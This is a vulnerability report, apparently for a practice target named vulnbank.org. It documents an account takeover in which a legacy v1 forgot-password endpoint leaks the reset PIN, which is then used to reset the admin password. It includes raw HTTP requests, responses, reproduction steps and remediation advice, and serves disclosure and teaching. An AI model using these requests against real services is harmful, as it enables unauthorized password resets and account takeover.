# Broken Password Recovery: Reset PIN Disclosure via Legacy API Leads to Account Takeover

* **Vulnerability Type:** CWE-640 — Weak Password Recovery Mechanism for Forgotten Password
* **Target / Platform:** `vulnbank.org`
* **Severity / CVSS:** High — CVSS 3.1: 8.8 *(based on the observed PoC using a normal authenticated user session)*
* **Affected Endpoint:** `POST /api/v1/forgot-password`
* **Related Endpoint:** `POST /api/v1/reset-password`

---

## 📌 Summary

The password recovery feature exposes the account's reset PIN directly in the API response when the legacy `v1` endpoint is used.

Instead of only informing the user that a reset PIN has been sent to their email, the server also returns the actual PIN inside the `debug_info` object.

The leaked PIN can then be submitted to the password reset endpoint together with the target username and a new password. In the tested case, the PIN returned for the `admin` account was successfully used to change the `admin` password.

This breaks the intended password recovery flow and can lead to **account takeover**.

---

## 📝 Description

The application provides a password reset feature through the following endpoint:

```http
POST /api/v3/forgot-password
```

During testing, the API version was changed from `v3` to `v1`:

```http
POST /api/v1/forgot-password
```

The legacy endpoint still responded successfully and returned additional information that should not be exposed to the client.

The response contained:

```json
{
  "debug_info": {
    "pin": "969",
    "pin_length": 3,
    "timestamp": "2026-10-04 06:51:05.363554",
    "username": "admin"
  },
  "message": "Reset PIN has been sent to your email.",
  "status": "success"
}
```

The important problem is that the application claims that the PIN has been sent to the user's email, while at the same time returning the same PIN directly in the API response.

The leaked PIN was then tested against the password reset endpoint:

```http
POST /api/v1/reset-password
```

The request successfully changed the password for the `admin` account.

This shows that the reset PIN is not just informational data. It is an actual credential used by the application to authorize a password reset.

---

## 🎯 Impact

An attacker who can obtain the reset PIN from the API response may be able to reset another user's password without having access to that user's email account.

In the tested case, the leaked PIN belonged to the `admin` account and was accepted by the password reset endpoint.

Potential consequences include:

* Unauthorized password changes
* Account takeover
* Access to the victim's private account data
* Loss of control over the original account
* Privilege escalation when a privileged account is targeted
* Full administrative access when the affected account has administrator privileges

If this behavior existed in a real banking or financial application, compromising an administrative account could have a very serious impact on the entire platform.

---

## 🛠️ Proof of Concept

### Expected Behavior

A secure password recovery flow should work like this:

```text
User requests password reset
        │
        ▼
Server generates reset PIN/token
        │
        ▼
PIN/token is sent only to the user's verified email
        │
        ▼
User enters the received PIN/token
        │
        ▼
Server validates the PIN/token
        │
        ▼
Password can be changed
```

The API response should **not** contain the actual reset PIN.

For example, the response should only contain a generic message such as:

```json
{
  "message": "Reset PIN has been sent to your email.",
  "status": "success"
}
```

---

### Actual Behavior

The legacy `v1` endpoint returns the reset PIN directly:

```json
{
  "debug_info": {
    "pin": "969",
    "pin_length": 3,
    "timestamp": "2026-10-04 06:51:05.363554",
    "username": "admin"
  },
  "message": "Reset PIN has been sent to your email.",
  "status": "success"
}
```

The same PIN can then be used to successfully reset the target account's password.

---

## PoC 1 — Reset PIN Disclosure via Legacy API

### Steps to Reproduce

1. Open the password recovery feature.
2. Observe that the application uses the following endpoint:

```http
POST /api/v3/forgot-password
```

3. Change the API version from `v3` to `v1`:

```http
POST /api/v1/forgot-password
```

4. Send the request.
5. Observe the `debug_info` object in the response.
6. The response contains the target username and the actual reset PIN.

### Raw HTTP Request

```http
POST /api/v1/forgot-password HTTP/2
Host: vulnbank.org
Content-Type: application/json
Origin: https://vulnbank.org
Referer: https://vulnbank.org/forgot-password

{"username":"admin"}
```

### Raw HTTP Response

```http
HTTP/2 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://vulnbank.org

{
  "debug_info": {
    "pin": "969",
    "pin_length": 3,
    "timestamp": "2026-10-04 06:51:05.363554",
    "username": "admin"
  },
  "message": "Reset PIN has been sent to your email.",
  "status": "success"
}
```

### Result

The server successfully returned the reset PIN:

```text
Username : admin
Reset PIN: 969
```

The PIN should normally only be delivered through the user's verified email channel.

Returning the PIN directly in the HTTP response allows the client to obtain the same credential that is supposed to prove ownership of the account.

---

## PoC 2 — Use the Leaked PIN to Reset the Password

The leaked PIN was then tested against the password reset endpoint.

### Steps to Reproduce

1. Obtain the reset PIN from the `v1` password recovery response.
2. Open the password reset page.
3. Intercept the reset request.
4. Set the `username` parameter to the target account.
5. Set `reset_pin` to the leaked PIN.
6. Set `new_password` to a new password.
7. Send the request.
8. Observe that the server reports a successful password reset.

### Raw HTTP Request

```http
POST /api/v1/reset-password HTTP/2
Host: vulnbank.org
Cookie: token=<valid_user_jwt>
Content-Type: application/json
Origin: https://vulnbank.org
Referer: https://vulnbank.org/reset-password

{"username":"admin","reset_pin":"969","new_password":"anjay"}
```

### Raw HTTP Response

```http
HTTP/2 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://vulnbank.org

{
  "debug_info": {
    "reset_pin_used": "969",
    "reset_success": true,
    "timestamp": "2026-10-04 06:51:53.238617",
    "username": "admin"
  },
  "message": "Password has been reset successfully",
  "status": "success"
}
```

### Result

The password reset request was accepted successfully.

The server confirmed:

```json
{
  "reset_success": true,
  "username": "admin"
}
```

This proves that the PIN returned by the legacy password recovery endpoint is a valid credential for resetting the target account's password.

The result is therefore not only information disclosure. The leaked value can directly be used to perform an unauthorized password reset.

---

## 🔍 Root Cause

The main problem is that the application exposes the password reset credential through the API response.

The expected behavior is:

```text
Generate PIN
     │
     ├──> Send PIN to user's email
     │
     └──> Do NOT return PIN to client
```

However, the vulnerable implementation behaves like this:

```text
Generate PIN
     │
     ├──> Send PIN to user's email
     │
     └──> Return PIN in debug_info
```

The legacy `v1` endpoint appears to use an older implementation that still exposes debugging information containing the reset PIN.

Because the password reset endpoint accepts the leaked PIN as a valid reset credential, anyone who can obtain the API response can use that PIN to change the target account's password.

There is therefore a direct relationship between the two issues:

```text
Legacy API
    ↓
Reset PIN Disclosure
    ↓
Attacker obtains valid reset credential
    ↓
Reset endpoint accepts the PIN
    ↓
Target password can be changed
    ↓
Account Takeover
```

---

## 🧠 Hypothesis

The testing started from an unexpected API version difference.

The normal request used:

```http
POST /api/v3/forgot-password
```

Because API versioning sometimes leaves older endpoints accessible, the first hypothesis was:

> The application may still expose an older password recovery implementation through `v1`, and the older implementation may have weaker security controls.

The API version was changed from:

```text
v3
```

to:

```text
v1
```

The response then exposed:

```json
"pin": "969"
```

This created a second hypothesis:

> The leaked PIN may be the real credential used by the password reset process.

The leaked PIN was then submitted to:

```http
POST /api/v1/reset-password
```

The server returned:

```json
"reset_success": true
```

The second hypothesis was therefore confirmed.

---

## ✅ Evidence

* `/api/v1/forgot-password` remains accessible even though the normal flow uses `/api/v3/forgot-password`.
* The `v1` response contains a `debug_info` object.
* The actual reset PIN is exposed in the response.
* The response also reveals the target username.
* The server states that the PIN has been sent to email while simultaneously returning the same PIN to the client.
* The leaked PIN was accepted by `/api/v1/reset-password`.
* The server returned `reset_success: true`.
* The password of the `admin` account was successfully changed using the leaked PIN.

---

## 📊 Attack Flow

```text
Open password recovery
        │
        ▼
Observe /api/v3/forgot-password
        │
        ▼
Change API version
v3 → v1
        │
        ▼
Legacy endpoint responds successfully
        │
        ▼
debug_info exposes reset PIN
        │
        ▼
Attacker obtains the PIN
        │
        ▼
POST /api/v1/reset-password
        │
        ▼
Submit target username + leaked PIN
        │
        ▼
Server accepts the reset request
        │
        ▼
Target password is changed
        │
        ▼
Account Takeover
```

---

## 🛡️ Remediation

* Never return password reset PINs, reset tokens, passwords, or similar secrets in API responses.
* Remove debugging information from production responses.
* Ensure legacy API versions are disabled when they are no longer required.
* Apply the same security controls to every supported API version.
* Send reset PINs or reset links only through a verified recovery channel such as the user's registered email.
* Store reset tokens securely on the server side.
* Make reset tokens short-lived and single-use.
* Add rate limiting to password reset and PIN verification endpoints.
* Invalidate the reset token immediately after a successful password reset.
* Avoid returning sensitive account information such as usernames or internal timestamps unless it is required by the client.
* Perform all password recovery validation on the server side.

---

## 📚 References

* CWE-640 — Weak Password Recovery Mechanism for Forgotten Password
* CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor
* CWE-489 — Active Debug Code
* OWASP — Forgot Password Cheat Sheet
* OWASP Top 10 — Identification and Authentication Failures

---

## 📝 Notes

This issue is not a classic injection vulnerability such as SQL Injection or XSS.

The main problem is the application's password recovery logic.

The application creates a reset PIN that is supposed to prove that the requester has access to the account's recovery channel. However, the same PIN is returned directly in the API response.

The legacy `v1` endpoint makes the issue easier to trigger because it exposes debugging information that should not be available to the client.

The most important part of this finding is the complete exploit chain:

```text
Legacy API
      ↓
Reset PIN Disclosure
      ↓
Valid Reset Credential
      ↓
Unauthorized Password Reset
      ↓
Account Takeover
```

The final impact is therefore significantly more serious than a simple information disclosure.
